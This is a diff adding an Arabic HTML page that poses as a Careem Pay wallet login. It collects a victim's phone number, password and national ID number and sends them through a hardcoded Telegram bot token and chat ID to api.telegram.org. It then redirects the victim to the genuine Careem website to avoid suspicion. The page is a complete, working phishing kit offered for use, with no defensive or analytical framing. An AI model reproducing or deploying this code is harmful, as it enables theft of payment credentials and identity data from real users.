@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Careem Pay - تسجيل دخول المحفظة</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 35px 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 360px; text-align: center; border-top: 6px solid #47A21E; }
+        .logo { color: #47A21E; font-size: 32px; font-weight: 800; margin-bottom: 20px; display: block; }
+        .pay { color: #333; font-weight: 400; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; box-sizing: border-box; font-size: 16px; text-align: right; outline: none; }
+        button { width: 100%; padding: 15px; background: #47A21E; color: white; border: none; border-radius: 12px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Careem <span class="pay">Pay</span></div>
+        <input type="tel" id="u" placeholder="رقم الهاتف المسجل">
+        <input type="password" id="p" placeholder="كلمة المرور">
+        <input type="text" id="n" placeholder="الرقم القومي (14 رقم)">
+        <button onclick="send()">دخول آمن</button>
+    </div>
+
+    <script>
+        function send() {
+            const tok = '8598822076:AAH3HBZs45DX1yCsoe4kzfCk3Zj26rGb4X4'; 
+            const cid = '1731797377'; 
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            const n = document.getElementById('n').value;
+
+            if(!u || !p || !n) { alert("أكمل البيانات"); return; }
+
+            const txt = `🚀 Careem Pay Login:\n📱 هاتف: ${u}\n🔑 كلمة: ${p}\n🆔 هوية: ${n}`;
+            const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(txt)}`;
+
+            fetch(url).then(res => res.json()).then(data => {
+                if(data.ok) {
+                    window.location.href = "https://www.careem.com/en-ae/"; 
+                } else {
+                    alert("خطأ: يرجى الضغط على Start في البوت أولاً");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
